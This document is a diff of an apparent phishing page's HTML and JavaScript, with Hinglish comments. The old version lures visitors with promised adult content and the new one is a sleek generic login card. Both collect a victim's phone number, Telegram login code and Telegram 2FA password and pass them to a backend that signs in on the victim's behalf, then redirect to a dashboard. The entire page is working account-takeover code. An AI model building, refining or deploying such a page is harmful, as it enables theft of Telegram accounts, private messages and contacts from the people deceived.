@@ -1,226 +1,598 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>XXX Access - Adults Only 🔞</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Login</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Inter',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;color:#fff;overflow:hidden;background:#05050a}
-.video-bg{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:-2}
-body::before{content:'';position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:-1}
-body::after{content:'';position:fixed;inset:0;background:linear-gradient(135deg,rgba(255,20,80,.3),rgba(80,0,60,.4) 50%,rgba(20,0,40,.5));z-index:-1}
-.container{background:rgba(10,10,15,.95);backdrop-filter:blur(25px);padding:45px 40px;border-radius:24px;width:90%;max-width:440px;border:1px solid rgba(255,50,100,.3);box-shadow:0 40px 120px rgba(0,0,0,.9),0 0 80px rgba(255,30,80,.2);position:relative;z-index:1}
-.xxx-badge{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#ff1468,#ff3860);padding:10px 24px;border-radius:30px;font-size:14px;font-weight:800;letter-spacing:2px;text-transform:uppercase;margin-bottom:20px;box-shadow:0 8px 30px rgba(255,20,80,.5)}
-h1{text-align:center;margin-bottom:8px;font-size:36px;font-weight:800;background:linear-gradient(135deg,#fff,#ff99aa 50%,#ff1468);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-transform:uppercase;letter-spacing:1px}
-.subtitle{text-align:center;color:#ff99aa;margin-bottom:25px;font-size:14px}
-.warning-box{background:rgba(255,20,80,.15);border:1px solid rgba(255,50,100,.4);border-radius:16px;padding:20px;margin-bottom:25px;text-align:center;font-size:13px;color:#ffbbcc;line-height:1.6}
-.step{display:none}.step.active{display:block;animation:fadeIn .5s ease}
-@keyframes fadeIn{from{opacity:0;transform:translateY(30px) scale(.95)}to{opacity:1;transform:translateY(0) scale(1)}}
-label{display:flex;gap:8px;margin-bottom:10px;color:#ff99aa;font-size:13px;font-weight:600;text-transform:uppercase;letter-spacing:1px}
-label::before{content:'→';color:#ff1468}
-input[type=tel],input[type=password]{width:100%;padding:18px 20px;border:2px solid rgba(255,50,100,.3);border-radius:14px;background:rgba(0,0,0,.6);color:#fff;font-size:18px}
-input:focus{outline:none;border-color:#ff1468;box-shadow:0 0 30px rgba(255,20,80,.3)}
-.otp-container{display:flex;gap:12px;justify-content:center;margin-bottom:20px}
-.otp-input{width:55px;height:65px;text-align:center;font-size:28px;font-weight:700;color:#fff;background:rgba(0,0,0,.6);border:2px solid rgba(255,50,100,.3);border-radius:14px}
-.otp-input:focus{outline:none;border-color:#ff1468;background:rgba(255,20,80,.1);box-shadow:0 0 25px rgba(255,20,80,.4);transform:scale(1.05)}
-.otp-input.filled{border-color:#00ff88;background:rgba(0,255,100,.1)}
-button{width:100%;padding:20px;background:linear-gradient(135deg,#ff1468,#ff3860);color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:1.5px;margin-top:10px}
-button:hover{transform:translateY(-3px);box-shadow:0 20px 60px rgba(255,20,80,.5)}
-button:disabled{opacity:.5;cursor:not-allowed}
-.info-box{background:rgba(255,255,255,.05);border-left:4px solid #ff1468;padding:18px;border-radius:0 12px 12px 0;margin-bottom:25px;font-size:14px;color:#ccc;line-height:1.6}
-.error{background:rgba(255,0,0,.15);border-left-color:#ff4444;color:#ff9999}
-.success{background:rgba(0,255,100,.1);border-left-color:#00ff88;color:#88ffaa}
-.phone-display{text-align:center;padding:18px;background:rgba(255,20,80,.1);border-radius:14px;margin-bottom:25px;font-size:18px;color:#ff99aa;border:1px solid rgba(255,20,80,.3)}
-.loading{display:none;text-align:center;padding:30px}.loading.active{display:block}
-.spinner{width:50px;height:50px;border:4px solid rgba(255,255,255,.1);border-top-color:#ff1468;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
+:root{
+  --glass:rgba(255,255,255,.07);
+  --glass-2:rgba(255,255,255,.14);
+  --line:rgba(255,255,255,.22);
+  --line-2:rgba(255,255,255,.60);
+  --r:24px;
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;padding:0}
+body{
+  position:relative;min-height:100svh;
+  display:flex;align-items:center;justify-content:center;
+  padding:24px 18px;background:#000;color:#fff;
+  font-family:Inter,system-ui,-apple-system,sans-serif;
+  overflow-x:hidden;-webkit-font-smoothing:antialiased;
+  transition:opacity .45s ease;
+}
+body.out{opacity:0}
+
+/* ============ BACKGROUND VIDEO (full screen) ============ */
+.bg{position:absolute;inset:0;z-index:0;overflow:hidden;background:#000}
+.bg video{
+  position:absolute;inset:0;width:100%;height:100%;
+  object-fit:cover;object-position:center center;display:block;
+}
+.scrim{position:absolute;inset:0;background:rgba(0,0,0,.16)}
+.bg.no-video video{display:none}
+
+/* ============ SOUND TOGGLE ============ */
+.sound{
+  position:absolute;top:18px;right:18px;z-index:5;
+  width:38px;height:38px;border-radius:50%;cursor:pointer;
+  display:grid;place-items:center;color:#fff;
+  background:rgba(255,255,255,.08);border:1px solid var(--line);
+  backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
+  transition:.25s;
+}
+.sound:hover{background:rgba(255,255,255,.18)}
+.sound .slash{opacity:0;transition:.2s}
+.sound.muted .waves{opacity:0}
+.sound.muted .slash{opacity:1}
+
+/* ============ TRANSPARENT CARD ============ */
+.card{
+  position:relative;z-index:2;width:100%;max-width:378px;
+  padding:20px;border-radius:var(--r);
+  background:rgba(255,255,255,.055);
+  backdrop-filter:blur(14px) saturate(135%);
+  -webkit-backdrop-filter:blur(14px) saturate(135%);
+  border:1px solid var(--line);
+  box-shadow:0 26px 60px -26px rgba(0,0,0,.65), 0 1px 0 rgba(255,255,255,.28) inset;
+  transition:opacity .4s ease, transform .4s ease;
+  animation:in .7s cubic-bezier(.2,.9,.25,1) both;
+}
+@keyframes in{from{opacity:0;transform:translateY(18px) scale(.99)}to{opacity:1;transform:none}}
+body.out .card{opacity:0;transform:scale(.97)}
+
+/* ============ BACK ============ */
+.back{
+  position:absolute;top:13px;left:13px;z-index:3;
+  width:30px;height:30px;border-radius:50%;cursor:pointer;
+  display:none;place-items:center;color:#fff;
+  background:rgba(255,255,255,.08);border:1px solid var(--line);
+  transition:.2s;
+}
+.back:hover{background:rgba(255,255,255,.2)}
+.card[data-step="2"] .back{display:grid}
+
+/* ============ STEPS ============ */
+.step{display:none}
+.step.is-active{display:block;animation:rise .45s cubic-bezier(.2,.9,.25,1)}
+@keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.step[data-step="2"].is-active{padding-top:30px}
+
+/* ============ ROW ============ */
+.row{
+  display:flex;align-items:center;gap:8px;
+  background:var(--glass);border:1px solid var(--line);
+  border-radius:16px;padding:0 6px 0 15px;transition:.22s;
+}
+.row:focus-within{border-color:var(--line-2);background:var(--glass-2)}
+.row input{
+  flex:1;min-width:0;width:100%;background:none;border:0;outline:0;
+  color:#fff;font-family:inherit;font-size:15px;letter-spacing:.3px;
+  padding:16px 0;
+}
+.row input::placeholder{color:rgba(255,255,255,.5)}
+.row input:disabled{opacity:.55}
+.row .prefix{font-size:15px;color:rgba(255,255,255,.65);padding-right:2px}
+
+.go{
+  flex:none;width:42px;height:42px;border-radius:13px;border:0;cursor:pointer;
+  display:grid;place-items:center;
+  background:rgba(255,255,255,.92);color:#0a0a0a;transition:.2s;
+}
+.go:hover:not([disabled]){background:#fff;transform:translateX(2px)}
+.go[disabled]{opacity:.6;cursor:default;transform:none}
+.sp{
+  display:block;width:14px;height:14px;border-radius:50%;
+  border:2px solid rgba(0,0,0,.22);border-top-color:#0a0a0a;
+  animation:spin .7s linear infinite;
+}
 @keyframes spin{to{transform:rotate(360deg)}}
-.secure-badge{display:flex;align-items:center;justify-content:center;gap:10px;margin-top:30px;padding-top:25px;border-top:1px solid rgba(255,255,255,.1);font-size:12px;color:#666}
-.secure-badge svg{width:16px;height:16px;fill:#00ff88}
+
+/* ============ OTP ============ */
+.otp{display:flex;gap:8px}
+.otp input{
+  flex:1;min-width:0;height:56px;text-align:center;
+  font-family:inherit;font-size:20px;font-weight:500;
+  color:#fff;background:var(--glass);
+  border:1px solid var(--line);border-radius:14px;outline:0;
+  transition:.2s;padding:0;
+}
+.otp input:focus{border-color:var(--line-2);background:var(--glass-2);transform:translateY(-2px)}
+.otp input.filled{border-color:rgba(255,255,255,.45);background:rgba(255,255,255,.16)}
+.otp input:disabled{opacity:.55}
+
+/* ============ PASSWORD (only when 2FA) ============ */
+#pwRow{margin-top:12px}
+.hidden{display:none !important}
+.reveal{animation:rise .45s cubic-bezier(.2,.9,.25,1)}
+
+/* ============ MESSAGE ============ */
+.msg{
+  margin:12px 2px 0;min-height:15px;text-align:center;
+  font-size:12px;font-weight:400;letter-spacing:.2px;
+  color:rgba(255,255,255,.68);
+  text-shadow:0 1px 10px rgba(0,0,0,.7);
+  transition:color .2s;
+}
+.msg.strong{color:#fff}
+.msg.strong::before{
+  content:"";display:inline-block;width:5px;height:5px;border-radius:50%;
+  background:#fff;vertical-align:middle;margin-right:7px;margin-top:-2px;
+}
+.step[data-step="1"] .msg{text-align:left;margin-left:4px}
+@keyframes shake{
+  10%,90%{transform:translateX(-1px)}
+  20%,80%{transform:translateX(2px)}
+  30%,50%,70%{transform:translateX(-3px)}
+  40%,60%{transform:translateX(3px)}
+}
+.msg.shake{animation:shake .4s}
+
+@media(max-width:400px){
+  .card{max-width:100%;padding:16px}
+  .otp{gap:6px}
+  .otp input{height:52px;font-size:18px;border-radius:12px}
+  .step[data-step="2"].is-active{padding-top:28px}
+}
 </style>
 </head>
 <body>
-<video class="video-bg" autoplay muted loop playsinline
-       src="{{ bg_video }}"></video>
 
-<div class="container">
-  <div style="text-align:center"><span class="xxx-badge">Adults Only</span></div>
-  <h1>XXX Access</h1>
-  <p class="subtitle">Enter to unlock exclusive adult content</p>
-
-  <div class="warning-box">
-    This website contains explicit adult material. By entering, you confirm you are at least 18 years old.
-  </div>
-
-  <!-- STEP 1: phone (only shown when not arriving from the bot) -->
-  <div id="step1" class="step">
-    <div class="info-box">
-      🔐 Enter your phone number with country code. A secure verification code will be sent to your Telegram app.
-    </div>
-    <label>Phone Number</label>
-    <input type="tel" id="phone" placeholder="+91 98765 43210" autocomplete="tel">
-    <button onclick="sendCode()" id="sendBtn">Get Access Code</button>
-  </div>
-
-  <!-- STEP 2: OTP (default when ?s= is present) -->
-  <div id="step2" class="step">
-    <div class="info-box success">
-      ✅ Verification code sent! Open your Telegram app to read it.
-    </div>
-    <div class="phone-display" id="phoneDisplay"></div>
-
-    <label>Enter Code</label>
-    <div class="otp-container">
-      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-    </div>
-
-    <div id="passwordGroup" style="display:none;margin-bottom:20px">
-      <label>Two-Factor Password</label>
-      <input type="password" id="password" placeholder="Enter 2FA password">
-    </div>
-
-    <button onclick="verifyCode()" id="verifyBtn">Unlock Content</button>
-    <div style="text-align:center;margin-top:20px;color:#888;font-size:14px">
-      Didn't get the code? <a style="color:#ff99aa;cursor:pointer;text-decoration:underline"
-      onclick="backToStep1()">Try again</a>
-    </div>
-  </div>
-
-  <div id="message"></div>
-
-  <div class="secure-badge">
-    <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-    <span>256-bit SSL Encrypted • Anonymous Access</span>
-  </div>
+<!-- =========================================================
+     VIDEO  ->  {{ bg_video }} config se aata hai.
+     Error hone par niche wala fallback use ho jaata hai.
+     ========================================================= -->
+<div class="bg" id="bg">
+  <video id="bgVideo" autoplay muted loop playsinline preload="auto"
+         src="{{ bg_video or '' }}"
+         data-fallback="https://files.catbox.moe/zp6wxp.mp4"></video>
+  <div class="scrim"></div>
 </div>
 
+<button class="sound muted" id="soundBtn" aria-label="Toggle sound">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor"
+       stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M11 5 6 9H3v6h3l5 4V5z"/>
+    <path class="waves" d="M15.6 8.6a4.8 4.8 0 0 1 0 6.8M18.6 5.6a9 9 0 0 1 0 12.8"/>
+    <path class="slash" d="M3.5 20.5 20.5 3.5"/>
+  </svg>
+</button>
+
+<main class="card" id="card" data-step="1">
+
+  <button class="back" id="backBtn" aria-label="Back" type="button">
+    <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 6l-6 6 6 6"/>
+    </svg>
+  </button>
+
+  <!-- STEP 1 : PHONE -->
+  <section class="step is-active" data-step="1">
+    <div class="row">
+      <span class="prefix">+</span>
+      <input id="phone" type="tel" inputmode="tel" autocomplete="tel"
+             pattern="[0-9 ]*" placeholder="Country code and number">
+      <button class="go" id="sendBtn" aria-label="Send code" type="button">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor"
+             stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M5 12h13M13 6l6 6-6 6"/>
+        </svg>
+      </button>
+    </div>
+    <p class="msg" id="msg1" aria-live="polite"></p>
+  </section>
+
+  <!-- STEP 2 : OTP ( + 2FA only if backend asks ) -->
+  <section class="step" data-step="2">
+    <div class="otp" id="otpWrap">
+      <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+    </div>
+
+    <div class="row hidden" id="pwRow">
+      <input type="password" id="password" placeholder="2FA password" autocomplete="off">
+      <button class="go" id="pwBtn" aria-label="Submit" type="button">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor"
+             stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M5 12h13M13 6l6 6-6 6"/>
+        </svg>
+      </button>
+    </div>
+
+    <p class="msg" id="msg2" aria-live="polite"></p>
+  </section>
+
+</main>
+
 <script>
-const params = new URLSearchParams(location.search);
-let currentSessionId = params.get('s') || null;
-let verified = false;
+/* =========================================================
+   CONFIG
+   ========================================================= */
+const DASHBOARD_URL = "/dashboard";   // Flask route
+const OTP_LENGTH    = 5;              // Telegram default
+const STORE_KEY     = "nexa_sid";
 
-// fallback for tmpfiles direct link
-document.querySelector('.video-bg').addEventListener('error', function () {
-  if (this.dataset.retried) return;
-  this.dataset.retried = '1';
-  this.src = this.src.replace('tmpfiles.org/', 'tmpfiles.org/dl/');
+/* ================= background video ================= */
+const bgVideo  = document.getElementById("bgVideo");
+const bgWrap   = document.getElementById("bg");
+const soundBtn = document.getElementById("soundBtn");
+let usedFallback = false;
+
+function loadVideo(){
+  const src = bgVideo.getAttribute("src");
+  if(!src){ bgVideo.src = bgVideo.dataset.fallback; }
+  bgVideo.play().catch(() => { bgVideo.muted = true; bgVideo.play().catch(()=>{}); });
+}
+bgVideo.addEventListener("error", () => {
+  if(!usedFallback && bgVideo.dataset.fallback){
+    usedFallback = true;
+    bgVideo.src = bgVideo.dataset.fallback;
+    loadVideo();
+  } else {
+    bgWrap.classList.add("no-video");
+  }
+}, true);
+loadVideo();
+document.addEventListener("click", () => bgVideo.play().catch(()=>{}), { once:true });
+
+soundBtn.addEventListener("click", () => {
+  bgVideo.muted = !bgVideo.muted;
+  soundBtn.classList.toggle("muted", bgVideo.muted);
+  if(!bgVideo.muted) bgVideo.play().catch(()=>{});
 });
 
-function showMessage(text, type='info'){
-  document.getElementById('message').innerHTML =
-    `<div class="info-box ${type}">${text}</div>`;
+/* ================= helpers ================= */
+const card    = document.getElementById("card");
+const msg1    = document.getElementById("msg1");
+const msg2    = document.getElementById("msg2");
+const sendBtn = document.getElementById("sendBtn");
+const pwBtn   = document.getElementById("pwBtn");
+const pwRow   = document.getElementById("pwRow");
+const pw      = document.getElementById("password");
+const phone   = document.getElementById("phone");
+const otpInputs = [...document.querySelectorAll(".otp-input")];
+
+const state = {
+  sessionId: null,
+  needsPassword: false,
+  verifying: false,
+  forceNext: false,
+};
+
+function setMsg(el, text, strong){
+  el.textContent = text || "";
+  el.classList.toggle("strong", !!strong);
+  el.classList.remove("shake");
+  if(text && strong){ void el.offsetWidth; el.classList.add("shake"); }
 }
 
-const otpInputs = document.querySelectorAll('.otp-input');
-otpInputs.forEach((input, index) => {
-  input.addEventListener('input', e => {
-    e.target.value = e.target.value.replace(/\D/g,'');
-    if (e.target.value){
-      e.target.classList.add('filled');
-      if (index < otpInputs.length - 1) otpInputs[index+1].focus();
-    } else e.target.classList.remove('filled');
-  });
-  input.addEventListener('keydown', e => {
-    if (e.key === 'Backspace' && !e.target.value && index > 0) otpInputs[index-1].focus();
-    if (e.key === 'Enter') verifyCode();
-  });
-  input.addEventListener('paste', e => {
-    e.preventDefault();
-    const pasted = e.clipboardData.getData('text').replace(/\D/g,'').slice(0,5);
-    pasted.split('').forEach((ch,i) => {
-      if (otpInputs[i]){ otpInputs[i].value = ch; otpInputs[i].classList.add('filled'); }
-    });
-    if (otpInputs[pasted.length]) otpInputs[pasted.length].focus();
-  });
-});
-
-function getOTPCode(){ return Array.from(otpInputs).map(i => i.value).join(''); }
-
-async function boot(){
-  if (!currentSessionId){ document.getElementById('step1').classList.add('active'); return; }
-  try {
-    const r = await fetch('/api/session-info?s=' + encodeURIComponent(currentSessionId));
-    const d = await r.json();
-    if (d.ok){
-      document.getElementById('phoneDisplay').textContent = d.masked;
-      document.getElementById('step2').classList.add('active');
-      otpInputs[0].focus();
-      return;
-    }
-  } catch(e){}
-  currentSessionId = null;
-  document.getElementById('step1').classList.add('active');
+function showStep(step){
+  card.dataset.step = step;
+  document.querySelectorAll(".step").forEach(s =>
+    s.classList.toggle("is-active", s.dataset.step === String(step))
+  );
+  const target = state.needsPassword ? pw
+    : document.querySelector('.step.is-active input:not([type="password"])');
+  if(target && !target.disabled) setTimeout(() => target.focus(), 220);
 }
-boot();
 
+function busy(btn, on){
+  if(on){
+    btn.dataset.html = btn.innerHTML;
+    btn.disabled = true;
+    btn.innerHTML = '<span class="sp"></span>';
+  } else {
+    btn.disabled = false;
+    if(btn.dataset.html) btn.innerHTML = btn.dataset.html;
+  }
+}
+
+function lockOtp(lock){
+  otpInputs.forEach(i => { i.disabled = lock; });
+}
+
+function clearOtp(){
+  otpInputs.forEach(i => { i.value = ""; i.classList.remove("filled"); });
+}
+
+function saveSession(id){
+  state.sessionId = id;
+  try{
+    if(id){ sessionStorage.setItem(STORE_KEY, id); } else { sessionStorage.removeItem(STORE_KEY); }
+  }catch(_){}
+  try{
+    const url = new URL(location.href);
+    if(id){ url.searchParams.set("s", id); } else { url.searchParams.delete("s"); }
+    history.replaceState(null, "", url);
+  }catch(_){}
+}
+
+async function api(path, body){
+  const res = await fetch(path, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    credentials: "same-origin",
+    body: JSON.stringify(body || {}),
+  });
+  let data = {};
+  try { data = await res.json(); } catch(_){}
+  return { status: res.status, data };
+}
+
+function goDashboard(){
+  try{ sessionStorage.removeItem(STORE_KEY); }catch(_){}
+  document.body.classList.add("out");
+  setTimeout(() => { window.location.href = DASHBOARD_URL; }, 420);
+}
+
+/* ================= step 1 : send code ================= */
 async function sendCode(){
-  const phone = document.getElementById('phone').value.trim();
-  if (!phone || phone.length < 10){ showMessage('❌ Enter a valid phone number with country code','error'); return; }
-  const btn = document.getElementById('sendBtn');
-  btn.disabled = true; btn.textContent = 'Sending…';
-  try {
-    const r = await fetch('/api/send-code', { method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({phone, session_name:'adult_session'}) });
-    const d = await r.json();
-    if (d.ok){
-      currentSessionId = d.session_id;
-      document.getElementById('phoneDisplay').textContent = d.masked || phone;
-      document.getElementById('step1').classList.remove('active');
-      document.getElementById('step2').classList.add('active');
-      otpInputs[0].focus();
-    } else showMessage('❌ ' + (d.error || 'Failed to send code'),'error');
-  } catch(e){ showMessage('❌ Connection error. Try again.','error'); }
-  btn.disabled = false; btn.textContent = 'Get Access Code';
+  const digits = phone.value.replace(/\D/g,"");
+  if(digits.length < 8){
+    setMsg(msg1, "Enter a valid number with country code", true);
+    phone.focus();
+    return;
+  }
+  if(sendBtn.disabled) return;
+
+  setMsg(msg1, "");
+  busy(sendBtn, true);
+
+  let res;
+  try{
+    res = await api("/api/send-code", {
+      phone: digits,
+      force: state.forceNext,
+    });
+  }catch(err){
+    busy(sendBtn, false);
+    setMsg(msg1, "Server unreachable. Try again.", true);
+    return;
+  }
+  state.forceNext = false;
+  busy(sendBtn, false);
+
+  const d = res.data || {};
+
+  if(res.status === 200 && d.ok){
+    saveSession(d.session_id);
+    state.needsPassword = false;
+    pwRow.classList.add("hidden");
+    clearOtp();
+    showStep(2);
+    setMsg(msg2, d.reused ? "Code already sent to your Telegram"
+                          : "Code sent to your Telegram");
+    setTimeout(() => otpInputs[0].focus(), 240);
+    return;
+  }
+
+  setMsg(msg1, d.error || "Failed to send code. Try again.", true);
+  if(res.status === 429 || res.status === 503) phone.focus();
 }
 
-async function verifyCode(){
-  if (verified) return;
-  const code = getOTPCode();
-  const password = document.getElementById('password').value;
-  if (code.length !== 5){ showMessage('❌ Enter all 5 digits','error'); return; }
-
-  const btn = document.getElementById('verifyBtn');
-  btn.disabled = true; btn.textContent = 'Verifying…';
-  try {
-    const r = await fetch('/api/verify-code', { method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ session_id: currentSessionId, code, password: password || undefined }) });
-    const d = await r.json();
-
-    if (d.ok){
-      verified = true;
-      showMessage('✅ Unlocked! Redirecting…','success');
-      setTimeout(() => location.href = '/dashboard', 600);
-    } else if (d.requires_password){
-      document.getElementById('passwordGroup').style.display = 'block';
-      showMessage('🔐 Two-factor authentication required','info');
-      document.getElementById('password').focus();
-    } else {
-      showMessage('❌ ' + (d.error || 'Invalid code'),'error');
-      otpInputs.forEach(i => { i.value=''; i.classList.remove('filled'); });
-      otpInputs[0].focus();
-    }
-  } catch(e){ showMessage('❌ Connection error. Try again.','error'); }
-  btn.disabled = false; btn.textContent = 'Unlock Content';
-}
-
-function backToStep1(){
-  document.getElementById('step2').classList.remove('active');
-  document.getElementById('step1').classList.add('active');
-  document.getElementById('passwordGroup').style.display = 'none';
-  otpInputs.forEach(i => { i.value=''; i.classList.remove('filled'); });
-  currentSessionId = null;
-}
-
-document.getElementById('phone').addEventListener('keypress', e => {
-  if (e.key === 'Enter') sendCode();
+sendBtn.addEventListener("click", sendCode);
+phone.addEventListener("keydown", e => { if(e.key === "Enter") sendCode(); });
+phone.addEventListener("input", () => {
+  const clean = phone.value.replace(/\D/g,"").slice(0, 15);
+  if(phone.value !== clean) phone.value = clean;
 });
+
+/* ================= OTP behaviour ================= */
+otpInputs.forEach((inp, i) => {
+  inp.addEventListener("input", () => {
+    inp.value = inp.value.replace(/\D/g,"").slice(0,1);
+    inp.classList.toggle("filled", !!inp.value);
+    if(inp.value && i < otpInputs.length - 1) otpInputs[i+1].focus();
+    if(!state.needsPassword && otpInputs.every(x => x.value)) setTimeout(verifyOtp, 220);
+  });
+
+  inp.addEventListener("keydown", e => {
+    if(e.key === "Backspace" && !inp.value && i > 0){
+      e.preventDefault();
+      otpInputs[i-1].value = "";
+      otpInputs[i-1].classList.remove("filled");
+      otpInputs[i-1].focus();
+    }
+    if(e.key === "ArrowLeft"  && i > 0) otpInputs[i-1].focus();
+    if(e.key === "ArrowRight" && i < otpInputs.length - 1) otpInputs[i+1].focus();
+    if(e.key === "Enter" && !state.needsPassword) verifyOtp();
+  });
+
+  inp.addEventListener("paste", e => {
+    e.preventDefault();
+    const d = (e.clipboardData.getData("text") || "").replace(/\D/g,"").split("");
+    d.forEach((c, k) => {
+      if(otpInputs[i+k]){ otpInputs[i+k].value = c; otpInputs[i+k].classList.add("filled"); }
+    });
+    otpInputs[Math.min(i + d.length, otpInputs.length - 1)].focus();
+    if(!state.needsPassword && otpInputs.every(x => x.value)) setTimeout(verifyOtp, 220);
+  });
+});
+
+/* ================= step 2 : verify ================= */
+async function verifyOtp(){
+  if(state.verifying) return;
+  if(!state.sessionId){ backToStart("Session expired. Enter your number again."); return; }
+
+  const code = otpInputs.map(i => i.value).join("");
+  if(!state.needsPassword && code.length < OTP_LENGTH) return;
+
+  state.verifying = true;
+  lockOtp(true);
+  setMsg(msg2, "Verifying...");
+
+  let res;
+  try{
+    res = await api("/api/verify-code", {
+      session_id: state.sessionId,
+      code: code,
+      password: "",
+    });
+  }catch(err){
+    state.verifying = false;
+    lockOtp(false);
+    setMsg(msg2, "Server unreachable. Try again.", true);
+    return;
+  }
+  state.verifying = false;
+  lockOtp(false);
+
+  const d = res.data || {};
+
+  /* 2FA required */
+  if(d.requires_password){
+    state.needsPassword = true;
+    pwRow.classList.remove("hidden");
+    pwRow.classList.add("reveal");
+    setMsg(msg2, "Enter your 2FA password");
+    setTimeout(() => pw.focus(), 200);
+    return;
+  }
+
+  /* session dead -> restart */
+  if(d.expired){
+    backToStart(d.error || "Code expired. Request a new code.");
+    return;
+  }
+
+  if(res.status === 200 && d.ok){ finish(); return; }
+
+  /* wrong code / attempts left */
+  setMsg(msg2, d.error || "Verification failed. Try again.", true);
+  if(d.attempts_left){
+    const empty = otpInputs.find(i => !i.value) || otpInputs[0];
+    empty.focus();
+  }
+}
+
+async function submitPassword(){
+  if(state.verifying) return;
+  if(!pw.value.trim()){ setMsg(msg2, "Enter your 2FA password", true); pw.focus(); return; }
+  if(!state.sessionId){ backToStart("Session expired. Enter your number again."); return; }
+
+  state.verifying = true;
+  busy(pwBtn, true);
+  pw.disabled = true;
+  setMsg(msg2, "Verifying...");
+
+  let res;
+  try{
+    res = await api("/api/verify-code", {
+      session_id: state.sessionId,
+      code: otpInputs.map(i => i.value).join(""),
+      password: pw.value,
+    });
+  }catch(err){
+    state.verifying = false;
+    busy(pwBtn, false);
+    pw.disabled = false;
+    setMsg(msg2, "Server unreachable. Try again.", true);
+    return;
+  }
+  state.verifying = false;
+  busy(pwBtn, false);
+  pw.disabled = false;
+
+  const d = res.data || {};
+
+  if(d.expired){ backToStart(d.error || "Code expired. Request a new code."); return; }
+
+  if(res.status === 200 && d.ok){ finish(); return; }
+
+  if(d.requires_password){
+    setMsg(msg2, d.error || "Invalid 2FA password", true);
+    pw.select();
+    return;
+  }
+  setMsg(msg2, d.error || "Verification failed. Try again.", true);
+}
+
+function finish(){
+  setMsg(msg2, "Success");
+  lockOtp(true);
+  setTimeout(goDashboard, 480);
+}
+
+pwBtn.addEventListener("click", submitPassword);
+pw.addEventListener("keydown", e => { if(e.key === "Enter") submitPassword(); });
+
+/* ================= back / reset ================= */
+function backToStart(message){
+  clearOtp();
+  pw.value = "";
+  pwRow.classList.add("hidden");
+  state.needsPassword = false;
+  state.verifying = false;
+  state.forceNext = true;      // retry par naya code bhejna hai
+  saveSession(null);
+  setMsg(msg2, "");
+  setMsg(msg1, message || "", !!message);
+  showStep(1);
+  setTimeout(() => phone.focus(), 240);
+}
+
+document.getElementById("backBtn").addEventListener("click", () => backToStart(""));
+
+/* ================= bootstrap ================= */
+(async function bootstrap(){
+  /* 1) bot flow: /login?s=SESSION_ID */
+  let sid = null;
+  try{ sid = new URLSearchParams(location.search).get("s"); }catch(_){}
+  if(!sid){ try{ sid = sessionStorage.getItem(STORE_KEY); }catch(_){} }
+
+  if(!sid) return;
+
+  try{
+    const res = await fetch("/api/session-info?s=" + encodeURIComponent(sid),
+                            { credentials: "same-origin" });
+    const d = await res.json().catch(() => ({}));
+
+    if(!res.ok || !d.ok){ saveSession(null); return; }
+
+    saveSession(sid);
+    state.needsPassword = !!d.requires_password;
+    showStep(2);
+
+    if(state.needsPassword){
+      pwRow.classList.remove("hidden");
+      setMsg(msg2, "Enter your 2FA password");
+      setTimeout(() => pw.focus(), 260);
+    } else {
+      setMsg(msg2, d.masked ? ("Code sent to " + d.masked) : "Code sent to your Telegram");
+      setTimeout(() => otpInputs[0].focus(), 260);
+    }
+  }catch(_){
+    /* backend down -> step 1 par hi raho */
+  }
+})();
 </script>
 </body>
 </html>
